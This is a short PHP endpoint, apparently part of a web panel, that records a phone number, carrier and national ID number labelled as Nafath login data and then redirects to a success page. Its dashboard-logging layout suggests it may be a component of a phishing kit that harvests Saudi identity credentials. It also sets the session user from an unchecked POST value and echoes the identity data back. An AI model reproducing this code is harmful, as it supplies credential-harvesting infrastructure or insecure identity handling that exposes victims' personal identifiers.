<?php
session_start();
require_once '../dashboard/init.php';

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false]);
    exit;
}

// ✅ استقبال user_id من POST
$userId = $_POST['user_id'] ?? $_SESSION['current_user_id'] ?? $_SESSION['client_id'] ?? null;

if (!$userId) {
    echo json_encode(['success' => false, 'message' => 'NO_USER']);
    exit;
}

// تثبيت في session
$_SESSION['current_user_id'] = $userId;
$_SESSION['client_id'] = $userId;

// حفظ بيانات نفاذ في session
if (!empty($_POST['phonenumber'])) {
    $_SESSION['nafad_phone'] = $_POST['phonenumber'];
}
if (!empty($_POST['telecom'])) {
    $_SESSION['nafad_telecom'] = $_POST['telecom'];
}
if (!empty($_POST['idNumber_new'])) {
    $_SESSION['nafad_id_number'] = $_POST['idNumber_new'];
}

// ✅ حفظ البيانات في قاعدة البيانات
$data = [
    'user_id'     => $userId,
    'phone'       => $_POST['phonenumber'] ?? null,
    'telecom'     => $_POST['telecom'] ?? null,
    'id_number'   => $_POST['idNumber_new'] ?? null,
    'redirect_to' => 'success.php'
];

$result = $User->insertNafadLog($data);

if (!$result) {
    echo json_encode([
        'success' => false,
        'message' => 'DB_ERROR'
    ]);
    exit;
}

echo json_encode([
    'success' => true,
    'data'    => $data
]);
exit;